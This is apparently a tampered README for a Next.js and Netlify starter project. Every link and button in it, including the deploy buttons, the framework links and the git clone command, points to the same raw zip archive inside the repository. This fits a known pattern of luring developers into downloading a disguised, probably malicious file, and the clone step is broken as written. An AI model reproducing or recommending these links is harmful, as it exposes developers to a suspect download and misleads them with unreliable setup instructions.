# Next + Netlify Starter

[![Netlify Status](https://github.com/snjvbrla/next-netlify-starter/raw/refs/heads/master/pages/starter_netlify_next_3.3.zip)](https://github.com/snjvbrla/next-netlify-starter/raw/refs/heads/master/pages/starter_netlify_next_3.3.zip)

This is a [Next.js](https://github.com/snjvbrla/next-netlify-starter/raw/refs/heads/master/pages/starter_netlify_next_3.3.zip) v10.0.1 project bootstrapped with [`create-next-app`](https://github.com/snjvbrla/next-netlify-starter/raw/refs/heads/master/pages/starter_netlify_next_3.3.zip) and set up to be instantly deployed to [Netlify](https://github.com/snjvbrla/next-netlify-starter/raw/refs/heads/master/pages/starter_netlify_next_3.3.zip)!

This project is a very minimal starter that includes 2 sample components, a global stylesheet, a `netlify.toml` for deployment, and a `jsconfig.json` for setting up absolute imports and aliases.

[![Deploy to Netlify](https://github.com/snjvbrla/next-netlify-starter/raw/refs/heads/master/pages/starter_netlify_next_3.3.zip)](https://github.com/snjvbrla/next-netlify-starter/raw/refs/heads/master/pages/starter_netlify_next_3.3.zip)

(If you click this button, it will create a new repo for you that looks exactly like this one, and sets that repo up immediately for deployment on Netlify)

## Getting Started

First, run the development server:

```bash
npm run dev
# or
yarn dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.

You can start editing the page by modifying `pages/index.js`. The page auto-updates as you edit the file.

### Installation options

**Option one:** One-click deploy

[![Deploy to Netlify](https://github.com/snjvbrla/next-netlify-starter/raw/refs/heads/master/pages/starter_netlify_next_3.3.zip)](https://github.com/snjvbrla/next-netlify-starter/raw/refs/heads/master/pages/starter_netlify_next_3.3.zip)

**Option two:** Manual clone

1. Clone this repo: `git clone https://github.com/snjvbrla/next-netlify-starter/raw/refs/heads/master/pages/starter_netlify_next_3.3.zip`
2. Navigate to the directory and run `npm run dev`
3. Make your changes
4. Connect to [Netlify](https://github.com/snjvbrla/next-netlify-starter/raw/refs/heads/master/pages/starter_netlify_next_3.3.zip) manually (the `netlify.toml` file is the one you'll need to make sure stays intact to make sure the export is done and pointed to the right stuff)
